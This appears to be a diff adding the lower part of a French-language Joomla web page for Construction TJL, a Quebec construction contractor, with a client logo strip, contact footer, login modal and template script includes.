+emsajax("#twoj_photo_gallery_menu1").zettaMenu({fullWidth : false,responsive: 'switch'}); init2JPhotoGallery( "1", "1", 1, {fullViewPort:"fit" ,skin:"dark" ,controls:{arrows:1 ,slideshow:0 ,toolbar:1 ,fullscreen:1 ,thumbnail:1 ,keyboard:1 ,mousewheel:1 ,swipe:1} ,path:"horizontal" ,text: {close:"Press Esc to close",enterFullscreen:"Enter Fullscreen (Shift+Enter)",exitFullscreen:"Exit Fullscreen (Shift+Enter)",slideShow:"Slideshow",next:"Next",previous:"Previous",}} );
+ });
+
+//]]>-->
+</script></div>
+
+<div class="custom"  >
+	<div id="btn_galerie">&nbsp;</div></div>
+
+            </div>
+        </div>
+
+    </div>
+
+
+
+    <span id="block10"></span>
+
+    <div style="background-color:#ffffff" class="cm-padding-bottom-36 " id="vg-bottom">
+
+        
+        
+        <div class="container">
+            <div class="row">
+
+                
+                    <div class="col-sm-12 col-md-12">
+
+                        
+
+<div class="custom mod-clients"  >
+	<h3>Nos clients</h3>
+<div class="row manufactures manufactures-list"><!-- START: Articles Anywhere --><p><a href="http://www.gerpro.com/accueil" target="_blank"><img src="/images/construction_tjl/logo-gerpro.png" alt="logo-gerpro" /></a><a href="http://cosoltec.com/" target="_blank"><img src="/images/construction_tjl/cosoltec.png" alt="cosoltec" /></a><a href="http://batimentsquebec.ca/" target="_blank"><img src="/images/construction_tjl/logo-cbq.png" alt="logo-cbq" /></a><a href="http://www.septfreres.com/" target="_blank"><img src="/images/construction_tjl/7freresconstruction.jpg" alt="7freresconstruction" /></a><a href="http://www.groupegeyser.com/" target="_blank"><img src="/images/construction_tjl/groupe_geyser.png" alt="groupe geyser" /></a>&nbsp;<img src="/images/construction_tjl/10906325_410719405757321_2526269608197546239_n.jpg" alt="10906325 410719405757321 2526269608197546239 n" width="109" height="109" /><img src="/images/construction_tjl/Logo-Lavacon.jpg" alt="Logo Lavacon" /><img src="/images/construction_tjl/logo-quorum-fr.png" alt="logo quorum fr" />&nbsp;<img src="/images/construction_tjl/tlchargement.jpg" alt="tlchargement" /></p> <!-- END: Articles Anywhere --></div>
+<p><!-- START: Articles Anywhere --><h2 class="mainTitle" style="margin: 5px 0px 15px; padding: 0px; border: 0px; font-weight: 400; font-size: 27px; line-height: 27px; font-family: 'Noto Sans', sans-serif; vertical-align: top; text-align: center; color: #787878;"><span style="margin: 0px; padding: 0px; border: 0px; font-style: inherit; font-variant: inherit; font-weight: bold; font-size: 14pt; line-height: inherit; font-family: inherit; vertical-align: top; color: rgb(128, 128, 128);">Merci &agrave; nos partenaires et clients pour leur confiance</span></h2>
+<h2 class="mainTitle" style="margin: 5px 0px 15px; padding: 0px; border: 0px; font-weight: 400; font-size: 27px; line-height: 27px; font-family: 'Noto Sans', sans-serif; vertical-align: top; text-align: center; color: #787878;"><span style="font-size: 14pt;">Nous sommes fiers de contribuer au succ&egrave;s et &agrave; l'essor de notre client&egrave;le.&nbsp;Nous remercions les clients et partenaires qui, &agrave; travers les ann&eacute;es,&nbsp;continuent de croire en notre vision,&nbsp;notre passion et&nbsp;notre engagement en mati&egrave;re d'excellence</span></h2> <!-- END: Articles Anywhere --></p></div>
+
+
+                    </div>
+
+                                                                
+            </div>
+        </div>
+    </div>
+
+
+</article>
+</section><!-- #main -->
+
+</div><!-- .page-box-content -->
+</div><!-- .page-box -->
+
+<footer id="footer">
+    <div class="footer-top">
+
+        
+            <div id="vg-footer">
+
+                <div class="container">
+                    <div class="row sidebar">
+
+                        
+                            <aside class="col-sm-6 col-md-6">
+
+                                
+
+<div class="custom footer-contact"  >
+	<h3>Contactez-nous</h3>
+<h5 class="majuscule">Construction TJL</h5>
+<p>1087 rue des Forges<br />Terrebonne QC <span style="font-size: 10pt; font-family: Verdana, sans-serif;">J6Y 0J9&nbsp;</span></p>
+<h5>Téléphone</h5>
+<p class="p-nomarge">450 621-8686</p>
+<h5>Fax</h5>
+<p>450 621-4646</p></div>
+
+
+                            </aside>
+
+                                                
+                            <aside class="col-sm-6 col-md-6">
+
+                                
+
+<div class="custom footer-contact contact2"  >
+	<p id="suivez-nous"><a href="https://www.facebook.com/Construction-TJL-inc-1480687492240508/?ref=br_rs" target="_blank"><img src="/images/construction_tjl/suivez-nous.png" alt="suivez nous" /></a></p>
+<div class="img_logo"><a href="http://www.constructiontjl.com/"><img src="/images/construction_tjl/tjl-noir.png" alt="tjl-noir" /></a></div>
+<div class="logo_right">
+<h5 class="majuscule">Entrepreneur en contruction<br />Gestionnaire de projet<br />En syst&egrave;me int&eacute;rieur</h5>
+<h5>Jessy Labb&eacute;</h5>
+<h5>Tommy Labb&eacute;</h5>
+</div></div>
+
+
+                            </aside>
+
+                                                                        
+                    </div>
+                </div>
+            </div>
+
+        
+    </div><!-- .footer-top -->
+    <div class="footer-bottom">
+        <div class="container">
+            <div class="row">
+                <div class="copyright col-xs-12 col-sm-6 col-md-6">
+                    Construction TJL © <script type="text/javascript">
+  document.write(new Date().getFullYear());
+</script> Tous droits réservés | <a href="https://constructiontjl.com/index.php/politique-de-confidentialite"> Politique de confidentialité</a>                </div>
+
+                
+                                        
+                       <!--  <aside class=""> -->
+                            <aside class="col-sm-3 col-md-3">
+
+                            
+
+<div class="custom propulser"  >
+	<p><a href="http://www.webtotal.ca/" target="_blank"><img src="/images/construction_tjl/signature_Webtotal-blanc.png" alt="signature Webtotal-blanc" /></a></p></div>
+
+
+                        </aside>
+
+                    				
+                
+                <div class="col-xs-12 col-sm-3 col-md-3">
+					<!--fenetre connexion-->
+					<div id="div_log"><a href="#&quot;" onclick="open_modal();"><img style="margin-left:10px;" src="/images/construction_tjl/Engrenage.png" alt="Engrenage" /></a></div>
+					<div id="myModal" class="modal fade" style="display: none;">
+						<div class="modal-dialog"><!-- Modal content-->
+							<div class="modal-content">
+								<div class="modal-header"><button class="close" onclick="close_modal()" type="button">×</button>
+									<h4 class="modal-title">Formulaire Connexion</h4>
+								</div>
+								<div class="modal-body"><!-- START: Modules Anywhere --><form action="/index.php" method="post" id="login-form" class="form-inline">
+		<div class="userdata">
+		<div id="form-login-username" class="control-group">
+			<div class="controls">
+									<div class="input-prepend">
+						<span class="add-on">
+							<span class="icon-user hasTooltip" title="Identifiant"></span>
+							<label for="modlgn-username" class="element-invisible">Identifiant</label>
+						</span>
+						<input id="modlgn-username" type="text" name="username" class="input-small" tabindex="0" size="18" placeholder="Identifiant" />
+					</div>
+							</div>
+		</div>
+		<div id="form-login-password" class="control-group">
+			<div class="controls">
+									<div class="input-prepend">
+						<span class="add-on">
+							<span class="icon-lock hasTooltip" title="Mot de passe">
+							</span>
+								<label for="modlgn-passwd" class="element-invisible">Mot de passe							</label>
+						</span>
+						<input id="modlgn-passwd" type="password" name="password" class="input-small" tabindex="0" size="18" placeholder="Mot de passe" />
+					</div>
+							</div>
+		</div>
+						<div id="form-login-remember" class="control-group checkbox">
+			<label for="modlgn-remember" class="control-label">Se souvenir de moi</label> <input id="modlgn-remember" type="checkbox" name="remember" class="inputbox" value="yes"/>
+		</div>
+				<div id="form-login-submit" class="control-group">
+			<div class="controls">
+				<button type="submit" tabindex="0" name="Submit" class="btn btn-primary login-button">Connexion</button>
+			</div>
+		</div>
+					<ul class="unstyled">
+							<li>
+					<a href="/index.php/component/users/?view=remind&amp;Itemid=101">
+					Identifiant oublié ?</a>
+				</li>
+				<li>
+					<a href="/index.php/component/users/?view=reset&amp;Itemid=101">
+					Mot de passe oublié ?</a>
+				</li>
+			</ul>
+		<input type="hidden" name="option" value="com_users" />
+		<input type="hidden" name="task" value="user.login" />
+		<input type="hidden" name="return" value="aHR0cHM6Ly9jb25zdHJ1Y3Rpb250amwuY29tL2FjY3VlaWwv" />
+		<input type="hidden" name="5d5b39f580a3eb92dc87fd03bce04cc0" value="1" />	</div>
+	</form>
+<!-- END: Modules Anywhere --></div>
+								<div class="modal-footer"><button class="btn btn-default" onclick="close_modal()" type="button">Fermer</button></div>
+							</div>
+						</div>
+					</div>
+	<!--***********************************-->
+                                            <a href="#" class="up">
+                            <span class="glyphicon glyphicon-arrow-up"></span>
+                        </a>
+                    					
+                </div>
+                
+            </div>
+        </div>
+    </div><!-- .footer-bottom -->
+</footer>
+<div class="clearfix"></div>
+
+<script src="/templates/vg_progressive/js/bootstrap.min.js"></script>
+<script src="/templates/vg_progressive/js/price-regulator/jshashtable-2.1_src.js"></script>
+<script src="/templates/vg_progressive/js/price-regulator/jquery.numberformatter-1.2.3.js"></script>
+<script src="/templates/vg_progressive/js/price-regulator/tmpl.js"></script>
+<script src="/templates/vg_progressive/js/price-regulator/jquery.dependClass-0.1.js"></script>
+<script src="/templates/vg_progressive/js/price-regulator/draggable-0.1.js"></script>
+<script src="/templates/vg_progressive/js/price-regulator/jquery.slider.js"></script>
+<script src="/templates/vg_progressive/js/jquery.carouFredSel-6.2.1-packed.js"></script>
+<script src="/templates/vg_progressive/js/jquery.touchSwipe.min.js"></script>
+<script src="/templates/vg_progressive/js/jquery.elevateZoom-3.0.8.min.js"></script>
+<script src="/templates/vg_progressive/js/jquery.imagesloaded.min.js"></script>
+<script src="/templates/vg_progressive/js/jquery.appear.js"></script>
+<script src="/templates/vg_progressive/js/jquery.sparkline.min.js"></script>
+<script src="/templates/vg_progressive/js/jquery.easypiechart.min.js"></script>
+<script src="/templates/vg_progressive/js/jquery.easing.1.3.js"></script>
+<script src="/templates/vg_progressive/js/jquery.fancybox.pack.js"></script>
+<script src="/templates/vg_progressive/js/isotope.pkgd.min.js"></script>
+<script src="/templates/vg_progressive/js/jquery.knob.js"></script>
+<script src="/templates/vg_progressive/js/jquery.stellar.min.js"></script>
+<script src="/templates/vg_progressive/js/jquery.selectBox.min.js"></script>
+<script src="/templates/vg_progressive/js/jquery.tubular.1.0.js"></script>
+<script src="/templates/vg_progressive/js/SmoothScroll.js"></script>
+<script src="/templates/vg_progressive/js/country.js"></script>
+<script src="/templates/vg_progressive/js/spin.min.js"></script>
+<script src="/templates/vg_progressive/js/ladda.min.js"></script>
+<script src="/templates/vg_progressive/js/masonry.pkgd.min.js"></script>
+<script src="/templates/vg_progressive/js/morris.min.js"></script>
+<script src="/templates/vg_progressive/js/raphael.min.js"></script>
+<script src="/templates/vg_progressive/js/video.js"></script>
+<script src="/templates/vg_progressive/js/pixastic.custom.js"></script>
+<script src="/templates/vg_progressive/js/livicons-1.3.min.js"></script>
+<script src="/templates/vg_progressive/js/bootstrapValidator.min.js"></script>
+<script src="/templates/vg_progressive/js/bootstrap-datepicker.js"></script>
+<script src="/templates/vg_progressive/js/jplayer/jquery.jplayer.min.js"></script>
+<script src="/templates/vg_progressive/js/jplayer/jplayer.playlist.min.js"></script>
+<script src="https://maps.googleapis.com/maps/api/js?v=3.exp&sensor=false&callback=initialize"></script>
+<script src="/templates/vg_progressive/js/main.js"></script>
+
+    <script>
+        // analytics here    </script>
+
+
+
+</body>
+</html>
+<!-------------------------------------------------------------------------------------------->
+    <script>
+    	window.onload = function(){ 
+			if(document.getElementById('btn_galerie') != null){
+				document.getElementById('btn_galerie').innerHTML = '';
+			}
+			
+			//par class
+			/*var choix=document.getElementsByClassName('btn_galerie');
+			for (i=0;i<choix.length;i++){
+				choix[i].innerHTML = '';
+			}*/
+		}
+    </script>
+	<!-------------------------------------------------------------------------------------------->
